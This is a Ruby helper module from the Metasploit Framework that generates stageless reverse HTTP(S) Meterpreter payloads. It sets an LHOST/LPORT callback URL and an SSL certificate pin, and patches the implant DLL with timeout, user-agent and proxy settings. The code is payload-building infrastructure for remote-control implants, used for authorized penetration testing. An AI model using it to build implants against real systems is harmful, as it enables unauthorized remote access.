##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/parser/x509_certificate'
require 'msf/core/payload/uuid_options'

module Msf

##
#
# Helper functionality for handling of stageless http(s) payloads
#
##

module Handler::ReverseHttp::Stageless

  include Msf::Payload::Windows::VerifySsl
  include Msf::Payload::UUIDOptions

  def initialize_stageless
    register_options([
      OptString.new('EXTENSIONS', [false, "Comma-separated list of extensions to load"]),
    ], self.class)
  end

  def generate_stageless(opts={})
    unless opts[:generator]
      raise ArgumentError, "Stageless generation requires a generator argument"
    end

    if opts[:ssl].nil?
      raise ArgumentError, "Stageless generation requires an ssl argument"
    end

    host = datastore['LHOST']
    host = "[#{host}]" if Rex::Socket.is_ipv6?(host)
    url = "http#{opts[:ssl] ? "s" : ""}://#{host}:#{datastore['LPORT']}"

    # Use the init_connect mode because we're stageless. This will force
    # MSF to generate a new URI when the first request is made.
    url << "#{generate_uri_uuid_mode(:init_connect)}/"

    # invoke the given function to generate the architecture specific payload
    opts[:generator].call(url) do |dll|

      verify_cert_hash = nil
      if opts[:ssl]
        verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                             datastore['HandlerSSLCert'])
      end

      Rex::Payloads::Meterpreter::Patch.patch_passive_service!(dll,
        :url           => url,
        :ssl           => opts[:ssl],
        :ssl_cert_hash => verify_cert_hash,
        :expiration    => datastore['SessionExpirationTimeout'].to_i,
        :comm_timeout  => datastore['SessionCommunicationTimeout'].to_i,
        :ua            => datastore['MeterpreterUserAgent'],
        :proxy_host    => datastore['PayloadProxyHost'],
        :proxy_port    => datastore['PayloadProxyPort'],
        :proxy_type    => datastore['PayloadProxyType'],
        :proxy_user    => datastore['PayloadProxyUser'],
        :proxy_pass    => datastore['PayloadProxyPass'])
    end

  end

end

end
